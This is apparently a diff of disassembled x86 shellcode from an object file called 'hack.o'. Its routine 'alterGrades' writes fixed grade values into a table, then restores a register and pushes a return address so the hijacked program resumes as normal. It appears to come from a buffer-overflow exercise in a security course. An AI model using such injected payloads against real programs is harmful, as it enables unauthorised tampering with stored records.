@@ -5,47 +5,41 @@ hack.o:     file format elf32-i386
 Disassembly of section .text:
 
 00000000 <alterGrades>:
-   0:	55                   	push   %ebp
-   1:	89 e5                	mov    %esp,%ebp
-   3:	c7 45 00 b8 da ff ff 	movl   $0xffffdab8,0x0(%ebp)
-   a:	83 ec 10             	sub    $0x10,%esp
-   d:	8b 45 08             	mov    0x8(%ebp),%eax
-  10:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
-  17:	8b 45 08             	mov    0x8(%ebp),%eax
-  1a:	05 90 01 00 00       	add    $0x190,%eax
-  1f:	c7 40 40 50 00 00 00 	movl   $0x50,0x40(%eax)
-  26:	8b 45 08             	mov    0x8(%ebp),%eax
-  29:	05 20 03 00 00       	add    $0x320,%eax
-  2e:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
-  35:	8b 45 08             	mov    0x8(%ebp),%eax
-  38:	05 b0 04 00 00       	add    $0x4b0,%eax
-  3d:	c7 40 40 64 00 00 00 	movl   $0x64,0x40(%eax)
-  44:	8b 45 08             	mov    0x8(%ebp),%eax
-  47:	05 40 06 00 00       	add    $0x640,%eax
-  4c:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  53:	8b 45 08             	mov    0x8(%ebp),%eax
-  56:	05 d0 07 00 00       	add    $0x7d0,%eax
-  5b:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  62:	8b 45 08             	mov    0x8(%ebp),%eax
-  65:	05 60 09 00 00       	add    $0x960,%eax
-  6a:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  71:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
-  78:	8b 45 fc             	mov    -0x4(%ebp),%eax
-  7b:	69 d0 90 01 00 00    	imul   $0x190,%eax,%edx
-  81:	8b 45 08             	mov    0x8(%ebp),%eax
-  84:	01 d0                	add    %edx,%eax
-  86:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  8d:	8b 45 08             	mov    0x8(%ebp),%eax
-  90:	05 80 0c 00 00       	add    $0xc80,%eax
-  95:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
-  9c:	8b 45 08             	mov    0x8(%ebp),%eax
-  9f:	05 10 0e 00 00       	add    $0xe10,%eax
-  a4:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
-  ab:	8b 45 08             	mov    0x8(%ebp),%eax
-  ae:	05 a0 0f 00 00       	add    $0xfa0,%eax
-  b3:	c7 40 40 5d 00 00 00 	movl   $0x5d,0x40(%eax)
-  ba:	c9                   	leave  
-  bb:	bb f4 af 70 55       	mov    $0x5570aff4,%ebx
-  c0:	83 c4 fc             	add    $0xfffffffc,%esp
-  c3:	c7 04 24 92 87 04 08 	movl   $0x8048792,(%esp)
-  ca:	c3                   	ret    
+   0:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+   5:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
+   c:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  11:	05 90 01 00 00       	add    $0x190,%eax
+  16:	c7 40 40 50 00 00 00 	movl   $0x50,0x40(%eax)
+  1d:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  22:	05 20 03 00 00       	add    $0x320,%eax
+  27:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
+  2e:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  33:	05 b0 04 00 00       	add    $0x4b0,%eax
+  38:	c7 40 40 64 00 00 00 	movl   $0x64,0x40(%eax)
+  3f:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  44:	05 40 06 00 00       	add    $0x640,%eax
+  49:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  50:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  55:	05 d0 07 00 00       	add    $0x7d0,%eax
+  5a:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  61:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  66:	05 60 09 00 00       	add    $0x960,%eax
+  6b:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  72:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
+  79:	8b 45 fc             	mov    -0x4(%ebp),%eax
+  7c:	69 d0 90 01 00 00    	imul   $0x190,%eax,%edx
+  82:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  87:	01 d0                	add    %edx,%eax
+  89:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  90:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  95:	05 80 0c 00 00       	add    $0xc80,%eax
+  9a:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
+  a1:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  a6:	05 10 0e 00 00       	add    $0xe10,%eax
+  ab:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
+  b2:	b8 c0 c8 04 08       	mov    $0x804c8c0,%eax
+  b7:	05 a0 0f 00 00       	add    $0xfa0,%eax
+  bc:	c7 40 40 5d 00 00 00 	movl   $0x5d,0x40(%eax)
+  c3:	bb f4 af 70 55       	mov    $0x5570aff4,%ebx
+  c8:	68 92 87 04 08       	push   $0x8048792
+  cd:	c3                   	ret    
